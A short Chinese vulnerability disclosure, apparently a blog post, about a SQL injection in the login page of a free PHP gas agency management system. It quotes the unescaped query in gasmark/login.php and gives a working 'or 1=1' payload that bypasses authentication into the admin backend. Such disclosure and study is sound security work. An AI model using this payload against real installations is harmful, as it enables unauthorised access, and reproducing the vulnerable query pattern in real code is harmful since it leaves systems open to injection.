# 简述
这个CMS的登录界面，未对参数进行转义，没有设置任何防护措施，导致了SQL注入，攻击者可通过万能密码实现登录后台
# 过程演示
文件位置为 gasmark/login.php，部分源码如下
```
if($_POST) {    

  $username = $_POST['username'];
  $password = $_POST['password'];


//echo $password;exit;
  if(empty($username) || empty($password)) {
    if($username == "") {
      $errors[] = "Username is required";
    } 

    if($password == "") {
      $errors[] = "Password is required";
    }
  } else {
    $sql = "SELECT * FROM users WHERE username = '$username'";
    $result = $connect->query($sql);
```
当我们使用如下payload时，可以绕过登录验证，直接进入后言
```
username: 1' or 1=1#
password: 1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e1f59036a87b46529b2403445caf85c2.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3232cb47c9ac418e983f6b7145bcf4d7.png)
源码链接
https://www.sourcecodester.com/php/15586/gas-agency-management-system-project-php-free-download-source-code.html
